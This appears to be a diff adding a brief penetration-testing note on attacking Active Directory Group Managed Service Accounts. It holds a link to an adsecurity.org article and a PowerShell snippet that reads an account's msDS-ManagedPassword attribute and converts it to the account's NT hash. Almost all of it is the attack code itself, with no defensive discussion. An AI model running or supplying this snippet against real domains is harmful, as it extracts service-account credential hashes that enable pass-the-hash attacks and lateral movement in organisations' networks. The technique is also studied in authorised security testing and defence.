@@ -1,1 +1,9 @@
 Attacking Active Directory Group Managed Service Accounts (GMSAs)
+
+https://adsecurity.org/?p=4367
+
+$gmsa = Get-ADServiceAccount -Identity '<nome da conta>' -Properties 'msDS-ManagedPassword'
+$blob = $gmsa. 'msDS-ManagedPassword'
+$mp = ConvertFrom-ADManagedPasswordBlob $blob
+$hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword
+$hash1
